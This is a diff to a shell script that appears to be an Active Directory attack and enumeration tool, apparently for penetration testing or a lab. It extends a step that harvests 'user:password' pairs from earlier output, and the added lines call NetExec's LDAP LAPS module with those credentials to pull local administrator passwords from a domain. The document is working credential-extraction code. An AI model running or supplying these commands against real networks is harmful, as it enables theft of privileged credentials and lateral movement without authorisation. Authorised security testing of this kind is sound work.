@@ -97,6 +97,12 @@ awk 'BEGIN{IGNORECASE=1}
      END { if(u!="" && p!=""){print u ":" p} }' "$OUT_MAIN" \
 | tee "$OUT_CASCADE" || true
 
+echo "==============================================================="
+echo "[*] Command: nxc ldap ${IP} -u '${USER}' -p '${PASS}' -d '${DOMAIN}' -M laps"
+echo "==============================================================="
+
+nxc ldap "${IP}" -u "${USER}" -p "${PASS}" -d "${DOMAIN}" -M laps  2>/dev/null 
+
 
 echo "==============================================================="
 echo "[*] Done. Results saved in $OUTDIR/"
